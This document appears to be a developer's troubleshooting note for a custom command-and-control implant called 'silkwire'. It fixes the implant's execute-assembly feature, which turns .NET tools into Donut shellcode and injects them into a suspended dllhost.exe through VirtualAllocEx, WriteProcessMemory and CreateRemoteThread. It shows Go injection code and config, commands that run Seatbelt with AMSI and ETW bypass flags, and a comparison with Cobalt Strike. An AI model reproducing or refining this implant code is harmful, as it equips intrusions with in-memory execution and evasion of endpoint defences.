# Donut Output Capture Fix

## Problem Summary

After fixing the ACCESS_VIOLATION crash (exit code 0xC0000005 → 0), the sacrificial process executes successfully but produces **no output**.

```
✓ Status: success
exit_code: 0            ← Fixed (was 0xC0000005)
output:                 ← Still empty (problem)
```

## Root Causes Identified

### 1. Unnecessary Thread Creation (Donut Config)
**Before:**
```go
Thread: 1  // Donut creates its own thread for assembly execution
```

**Problem:** We're already using `CreateRemoteThread` on the implant side, so having Donut create ANOTHER thread is redundant and can cause synchronization issues.

**Flow Before:**
```
Main thread (suspended) 
  └─> Remote thread (our CreateRemoteThread)
       └─> Assembly thread (Donut's thread)  ← Too many threads!
```

**After:**
```go
Thread: 0  // Don't create thread - we handle threading on implant side
```

**Flow After:**
```
Main thread (suspended)
  └─> Remote thread (executes Donut + Assembly directly)  ← Simpler, cleaner
```

### 2. Unicode vs ANSI Strings
**Before:**
```go
Unicode: 1  // Use Unicode strings
```

**Problem:** Unicode can cause issues with console output redirection in some scenarios.

**After:**
```go
Unicode: 0  // Use ANSI for better console output compatibility
```

### 3. Unnecessary Main Thread Resume
**Before (implant):**
```go
CreateRemoteThread(...)  // Start Donut in remote thread
ResumeThread(pi.Thread)  // Also resume main thread ← Why?
```

**Problem:** When using `CreateRemoteThread` injection, the standard pattern is to keep the main thread suspended. Resuming it is unnecessary and can cause issues:
- Main thread has nothing to do (dllhost.exe with no args does nothing)
- Could interfere with remote thread execution
- Not the standard pattern for this injection method

**After (implant):**
```go
CreateRemoteThread(...)  // Start Donut in remote thread
// Keep main thread suspended - standard CreateRemoteThread pattern
WaitForSingleObject(pi.Process)  // Wait for ExitProcess() from Donut
```

## Changes Made

### File: `server/assembly.go`

#### Lines 58-67 - Donut Configuration
```go
donutConfig := &donut.DonutConfig{
    Arch:     donutArch,
    Type:     moduleType,
    InstType: donut.DONUT_INSTANCE_PIC,
    Entropy:  donut.DONUT_ENTROPY_DEFAULT,
    ExitOpt:  2,           // Exit process when done ✓
    Compress: 1,           // Enable compression ✓
    Thread:   0,           // ← CHANGED: Don't create thread
    Unicode:  0,           // ← CHANGED: Use ANSI for console compatibility
}
```

### File: `implant/injection_windows.go`

#### Lines 3855-3868 - Removed Main Thread Resume
```go
// NOTE: We do NOT resume the main thread when using CreateRemoteThread injection.
// The remote thread executes the Donut loader independently while the main thread stays suspended.
// This is the standard pattern for CreateRemoteThread-based injection.
//
// Execution flow:
// 1. Remote thread (ours) executes Donut loader
// 2. Donut runs .NET assembly in same thread (Thread=0)
// 3. When assembly completes, Donut calls ExitProcess() (ExitOpt=2) 
// 4. Entire process terminates, pipes close, we collect output

// Wait for process to complete (with timeout)
// We wait for the PROCESS, not individual threads
timeout := 5 * time.Minute
waitResult, err := windows.WaitForSingleObject(pi.Process, uint32(timeout.Milliseconds()))
```

**Removed:**
```go
// OLD CODE (deleted):
_, err = windows.ResumeThread(pi.Thread)  // Don't do this!
```

## Execution Flow (After Fix)

```
┌─────────────────────────────────────────┐
│ Server                                  │
│ ├─ Receive .NET assembly                │
│ ├─ Configure Donut:                     │
│ │   - Thread: 0 (no extra thread)      │
│ │   - Unicode: 0 (ANSI)                │
│ │   - ExitOpt: 2 (exit process)        │
│ └─> Generate shellcode                  │
└─────────────┬───────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────┐
│ Implant                                 │
│ ├─> CreateProcess(SUSPENDED)            │
│ │    └─> Main thread: SUSPENDED ⏸      │
│ ├─> Setup pipes (STDOUT/STDERR)         │
│ ├─> VirtualAllocEx + WriteProcessMemory │
│ ├─> CreateRemoteThread                  │
│ │    └─> Remote thread: RUNNING ▶      │
│ └─> WaitForSingleObject(process)        │
└─────────────┬───────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────┐
│ Sacrificial Process (dllhost.exe)       │
│                                          │
│ Main Thread: ⏸ SUSPENDED (does nothing) │
│                                          │
│ Remote Thread: ▶ RUNNING                │
│  ├─> Donut loader executes              │
│  ├─> Load CLR (mscoree.dll)             │
│  ├─> Create AppDomain                   │
│  ├─> Load assembly from memory          │
│  ├─> Invoke Main(string[] args)         │
│  │    ├─> Assembly executes             │
│  │    └─> Console.WriteLine() → STDOUT  │
│  └─> ExitProcess(0)                     │
│       └─> Pipes close                   │
└─────────────┬───────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────┐
│ Output Collection                       │
│ ├─> Async goroutines read pipes         │
│ ├─> Collect all output chunks           │
│ └─> Return to operator                  │
└─────────────────────────────────────────┘
```

## Why These Changes Help

### 1. Simpler Threading Model
- **Before:** 3 threads (main suspended, remote running, assembly thread)
- **After:** 2 threads (main suspended, remote running)
- Simpler = fewer things that can go wrong

### 2. Better Console Output Compatibility
- ANSI strings work more reliably with console I/O redirection
- Unicode can cause encoding issues with pipes

### 3. Standard Injection Pattern
- Keeping main thread suspended is the documented pattern for CreateRemoteThread
- Used by Cobalt Strike, Metasploit, and other mature frameworks
- Prevents potential race conditions or interference

## Testing

### 1. Rebuild Server and Implant
```bash
# Server will regenerate shellcode with new Donut config
cd /home/pmw/silkwire
make server
make implant-windows
```

### 2. Test with Seatbelt
```bash
execute-assembly Seatbelt.exe -group=system
```

**Expected Output:**
```
✓ Status: success
exit_code: 0
output: |
  ====== Seatbelt ======
  
  [System Information]
  ...actual output from Seatbelt...
  
pid: 1234
spawned_process: C:\Windows\System32\dllhost.exe
```

### 3. Alternative: Test with Console Process
If output is still empty, try a known console application as sacrificial process:

```go
// In execute-assembly options
SacrificialProcess: "C:\\Windows\\System32\\cmd.exe"
```

This helps isolate whether the issue is with dllhost.exe specifically or with the output capture mechanism.

## Additional Debugging

If output is still empty after these changes:

### 1. Check Donut Parameters Field
The server sets `Parameters` from args. Verify this is being passed correctly:

```go
if len(args) > 0 {
    donutConfig.Parameters = strings.Join(args, ",")
}
```

### 2. Try Simple Test Assembly
Create a minimal .NET console app:

```csharp
using System;
class Program {
    static void Main(string[] args) {
        Console.WriteLine("Hello from .NET!");
        Console.Error.WriteLine("Error stream works too!");
    }
}
```

If this produces output but Seatbelt doesn't, it's a Seatbelt-specific issue.

### 3. Check Process Exit Code
- Exit code 0 = success
- Non-zero = error in assembly or Donut

### 4. Enable Donut Bypass
Try enabling AMSI/ETW bypass in execute-assembly options:

```
execute-assembly Seatbelt.exe -group=system --amsi-bypass --etw-bypass
```

This sets `Bypass: 3` in Donut config, which might help with output capture.

## Comparison with Working Implementations

### Merlin C2 (Reference)
- Thread: 0 or 1 (varies)
- Uses CreateRemoteThread
- Waits for process completion
- Captures output via pipes

### Cobalt Strike
- Uses similar approach
- Documented to work with dllhost.exe
- Thread model similar to our fixed version

### Our Implementation (After Fix)
- ✅ Thread: 0 (simpler)
- ✅ Unicode: 0 (better compatibility)
- ✅ CreateRemoteThread (standard)
- ✅ Main thread suspended (standard pattern)
- ✅ Wait for process (correct)
- ✅ Async pipe reading (prevents deadlocks)

## Expected Results

After these changes, execute-assembly should:

1. ✅ Not crash (exit code 0) - Already working
2. ✅ Capture STDOUT from .NET assembly - Should now work
3. ✅ Capture STDERR from .NET assembly - Should now work
4. ✅ Handle long-running assemblies - 5 minute timeout
5. ✅ Work with various assemblies (Seatbelt, SharpHound, etc.)

## Rollback Plan

If these changes cause issues, revert to previous Donut config:

```go
Thread: 1,
Unicode: 1,
```

And re-add ResumeThread in implant. But this should not be necessary - the new approach is more standard.

## Next Steps

1. Rebuild server and implant with these changes
2. Test with Seatbelt
3. If output appears: ✅ Problem solved!
4. If output still empty: Try cmd.exe as sacrificial process to isolate issue
5. Report results for further debugging if needed

---

**Note:** These changes align the implementation more closely with industry-standard CreateRemoteThread injection patterns and simplify the threading model for better reliability.

